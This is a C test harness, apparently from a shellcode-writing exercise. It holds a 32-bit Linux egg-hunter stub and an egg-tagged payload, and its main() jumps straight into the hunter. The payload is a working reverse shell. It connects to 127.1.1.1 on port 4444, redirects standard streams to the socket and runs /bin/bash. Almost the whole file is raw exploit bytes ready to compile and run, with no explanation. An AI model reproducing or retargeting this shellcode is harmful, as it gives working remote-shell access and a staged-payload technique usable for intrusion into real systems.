/*
Filename:	egg_hunter.c
Author:		Jules Adriaens
Compile:	gcc -o egg_hunter egg_hunter.c
*/

#include <stdio.h>
#include <string.h>

#define EGG "\x90\x50\x90\x50"

unsigned char egghunter[] = "\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

unsigned char shellcode[] = EGG EGG \
"\x31\xd2\x52\x31\xdb\x43\x53\x6a\x02\x89\xe1\x6a\x66\x58\xcd\x80\x96\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\x87\xde\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x52\xb0\x0b\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x89\xd1\xcd\x80";

main()
{
	printf("Shellcode Length:  %d\n", strlen(egghunter));
	int (*ret)() = (int(*)()) egghunter;
	ret();
}
